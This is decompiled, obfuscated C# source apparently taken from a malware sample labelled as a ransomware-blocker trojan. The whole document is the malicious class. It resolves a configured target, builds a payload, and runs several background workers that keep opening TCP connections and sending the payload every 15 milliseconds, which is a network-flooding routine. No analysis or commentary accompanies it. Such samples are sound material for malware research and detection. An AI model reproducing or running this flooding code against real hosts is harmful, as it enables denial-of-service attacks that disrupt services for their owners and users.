// Decompiled with JetBrains decompiler
// Type: ..
.
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BCD7F698-81A9-45B6-B776-A5010DB561F8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-79d9011ecd8a8c2b249f5f7f02fc71d724d9db23b2ea3aa0a787370b0766ca61.exe

using \u0001\u000E\u0003\u0004.\u0002\u0003\u0002\u000E\u0006\u000E.\u000A\u000B\u0005;
using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace \u0001\u000E\u0003\u0004.\u0002\u0003\u0002\u000E\u0006\u000E.\u000A\u000B\u0005
{
  internal class \u000B\u0005\u0002\u000C\u000D\u0004
  {
    private static IPEndPoint \u0005\u000C;
    private static BackgroundWorker[] \u0004\u000D\u0006\u000F;
    private static byte[] \u0002\u000E\u0004;
    private static bool \u0024FD\u002422 = false;
    public static string \u000E\u000C = string.Empty;
    public static string \u000C = string.Empty;
    public static ushort \u000E\u0006\u000B\u0002 = 0;
    private static int \u000A\u000E = 2;

    public static void \u000E()
    {
      try
      {
        \u000B\u0005\u0002\u000C\u000D\u0004.\u0005\u000C = new IPEndPoint(Dns.GetHostEntry(\u000B\u0005\u0002\u000C\u000D\u0004.\u000E\u000C).AddressList[0], (int) \u000B\u0005\u0002\u000C\u000D\u0004.\u000E\u0006\u000B\u0002);
      }
      catch
      {
        \u000B\u0005\u0002\u000C\u000D\u0004.\u0005\u000C = new IPEndPoint(IPAddress.Parse(\u000B\u0005\u0002\u000C\u000D\u0004.\u000E\u000C), (int) \u000B\u0005\u0002\u000C\u000D\u0004.\u000E\u0006\u000B\u0002);
      }
      \u000B\u0005\u0002\u000C\u000D\u0004.\u0002\u000E\u0004 = Encoding.Default.GetBytes(string.Format(\u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0002\u0001\u000B\u000B(), (object) \u000B\u0005\u0002\u000C\u000D\u0004.\u000C, (object) Environment.NewLine));
      \u000B\u0005\u0002\u000C\u000D\u0004.\u0004\u000D\u0006\u000F = new BackgroundWorker[\u000B\u0005\u0002\u000C\u000D\u0004.\u000A\u000E];
      \u000B\u0005\u0002\u000C\u000D\u0004.\u0024FD\u002422 = true;
      for (int index = 0; index < \u000B\u0005\u0002\u000C\u000D\u0004.\u000A\u000E; ++index)
      {
        \u000B\u0005\u0002\u000C\u000D\u0004.\u0004\u000D\u0006\u000F[index] = new BackgroundWorker();
        \u000B\u0005\u0002\u000C\u000D\u0004.\u0004\u000D\u0006\u000F[index].DoWork += new DoWorkEventHandler(\u000B\u0005\u0002\u000C\u000D\u0004.\u000B\u0006);
        \u000B\u0005\u0002\u000C\u000D\u0004.\u0004\u000D\u0006\u000F[index].WorkerSupportsCancellation = true;
        \u000B\u0005\u0002\u000C\u000D\u0004.\u0004\u000D\u0006\u000F[index].RunWorkerAsync();
      }
    }

    public static void \u000F\u000F\u000A\u0008\u000A\u0004()
    {
      try
      {
        \u000B\u0005\u0002\u000C\u000D\u0004.\u0024FD\u002422 = false;
        for (int index = 0; index < \u000B\u0005\u0002\u000C\u000D\u0004.\u000A\u000E; ++index)
        {
          \u000B\u0005\u0002\u000C\u000D\u0004.\u0004\u000D\u0006\u000F[index].CancelAsync();
          \u000B\u0005\u0002\u000C\u000D\u0004.\u0004\u000D\u0006\u000F[index] = (BackgroundWorker) null;
        }
      }
      catch
      {
      }
    }

    private static void \u000B\u0006(object A_0, DoWorkEventArgs _param1)
    {
      while (\u000B\u0005\u0002\u000C\u000D\u0004.\u0024FD\u002422)
      {
        try
        {
          Socket socket = new Socket(\u000B\u0005\u0002\u000C\u000D\u0004.\u0005\u000C.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
          socket.Connect((EndPoint) \u000B\u0005\u0002\u000C\u000D\u0004.\u0005\u000C);
          socket.Blocking = false;
          socket.Send(\u000B\u0005\u0002\u000C\u000D\u0004.\u0002\u000E\u0004, SocketFlags.None);
          Thread.Sleep(15);
        }
        catch
        {
        }
      }
    }
  }
}
